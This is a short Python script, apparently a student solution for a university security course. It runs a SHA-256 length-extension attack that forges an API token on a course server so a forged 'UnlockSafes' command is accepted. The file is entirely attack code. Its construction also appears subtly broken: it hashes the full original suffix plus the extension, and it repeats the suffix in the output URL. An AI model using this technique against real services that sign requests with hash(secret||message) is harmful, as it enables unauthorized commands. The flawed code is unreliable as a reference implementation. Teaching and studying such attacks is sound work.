#!/usr/bin/python3

# Run me like this:
# $ python3 len_ext_attack.py "http://cpsc4200.mpese.com/uniqname/lengthextension/api?token=...."
# or select "Length Extension" from the VS Code debugger

import sys
from urllib.parse import quote
from pysha256 import sha256, padding


class URL:
    def __init__(self, url: str):
        # prefix is the slice of the URL from "http://" to "token=", inclusive.
        self.prefix = url[:url.find('=') + 1]
        self.token = url[url.find('=') + 1:url.find('&')]
        # suffix starts at the first "command=" and goes to the end of the URL
        self.suffix = url[url.find('&') + 1:]

    def __str__(self) -> str:
        return f'{self.prefix}{self.token}&{self.suffix}'

    def __repr__(self) -> str:
        return f'{type(self).__name__}({str(self).__repr__()})'


def main():
    if len(sys.argv) < 2:
        print(f"usage: {sys.argv[0]} URL_TO_EXTEND", file=sys.stderr)
        sys.exit(-1)

    url = URL(sys.argv[1])

    prefix = url.prefix
    token = url.token
    suffix = url.suffix

    #length of unknown secret password used
    secret_key_len = 8

    #token len would be key_len + len of suffix
    full_token_len = secret_key_len + len(suffix)
    #padded token len would be full token len + padding len
    padded_token_len = full_token_len + len(padding(full_token_len))

    #edit suffix to command we actually want
    suffix += "&command=UnlockSafes"
    #create new hash from previous state and count needs to be the padded len
    h2 = sha256(state=bytes.fromhex(str(token)), count=padded_token_len)
    #update the hash with this new suffix
    h2.update(suffix.encode())
    token = h2.hexdigest()
    #convert non-ascii characters and put them into url + new suffix
    new_suffix = quote(padding(full_token_len)) + suffix
    #print URL
    print(prefix + h2.hexdigest() + "&" + url.suffix + new_suffix)


if __name__ == '__main__':
    main()
